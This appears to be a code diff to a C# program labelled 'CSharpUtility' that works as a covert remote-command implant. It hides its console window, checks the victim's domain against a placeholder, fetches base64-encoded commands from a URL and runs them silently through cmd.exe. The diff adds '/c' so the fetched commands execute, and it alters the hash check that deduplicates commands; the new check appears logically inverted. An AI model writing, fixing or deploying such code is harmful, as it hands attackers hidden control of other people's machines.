@@ -29,7 +29,7 @@ namespace CSharpUtility
                 startInfo.UseShellExecute = false;
                 startInfo.FileName = "cmd.exe";
                 startInfo.CreateNoWindow = true;
-                startInfo.Arguments = cmd;
+                startInfo.Arguments = "/c " + cmd;
                 p.StartInfo = startInfo;
                 p.Start();
 
@@ -43,7 +43,7 @@ namespace CSharpUtility
         static void Main(string[] args)
         {
             string url = args.Length > 1 ? args[0] : "URL";
-            byte[] currentMd5 = { };
+            string currentMd5 = "";
             ShowWindow(GetConsoleWindow(), 0);
             if (Environment.GetEnvironmentVariable("USERDOMAIN") == "CHANGEME")
             {
@@ -62,9 +62,9 @@ namespace CSharpUtility
                     string run = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));
 
                     MD5 md5 = MD5.Create();
-                    byte[] md5Result = md5.ComputeHash(Encoding.ASCII.GetBytes(run));
+                    string md5Result = Encoding.ASCII.GetString(md5.ComputeHash(Encoding.ASCII.GetBytes(run)));
 
-                    if (!Array.Equals(md5Result, currentMd5))
+                    if (md5Result.Equals(currentMd5))
                     {
                         if (run.Length > 0)
                         {
